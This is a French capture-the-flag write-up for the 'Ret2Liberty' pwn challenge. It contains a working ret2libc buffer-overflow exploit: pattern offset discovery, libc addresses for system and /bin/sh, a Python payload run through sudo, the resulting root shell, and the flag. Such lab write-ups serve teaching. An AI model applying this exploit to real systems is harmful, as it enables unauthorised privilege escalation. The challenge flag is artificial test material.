# **Ret2Liberty**.
## <u>**Catégorie**</u>

Pwn

## <u>**Description**</u> :

```
Trouver un moyen d'exploiter un buffer overflow pour obtenir un shell root
 
```

## <u>Hints</u> 

La librairie C peut aider à faire popper un shell (ret2libc)

## <u>Auteur</u> 

Processus Thief

## <u>Solution</u> :

-- On lance notre binaire avec un débuggueur (gdb)
gdb welcome
-- On peut trouver l'offset de EIP 
❯ msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
❯ msf-pattern_offset -q 0Ac1
[*] Exact match at offset 62
-- on trouve l'offset de l'instruction system et /bin/sh
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e18370 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f62363 ("/bin/sh")
-- on créer un shellcode avec le padding jusqu'à EIP, puis le system, un peu de padding et notre /bin/sh
import os
-- padding found with msf_pattern_offset
buf = "A"*62
-- overwrite EIP with string RETN
-- system : 0xf7e18370
-- bin/sh : 0xf7f62363
buf += str("\x70\x83\xe1\xf7" + "OSEF" + "\x63\x23\xf6\xf7")
print str(buf)
-- on exécute notre shellcode avec le préfixe "sudo" et on obtient un shell root
user1@ret2liberty:~$ sudo /home/user1/welcome $(python2 exploit.py)
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp�������c#�� !
-- id
uid=0(root) gid=0(root) groups=0(root)



##**Flag : MCTF{R3t2l1bC_1s_t0o_34sY_f0r_m3}**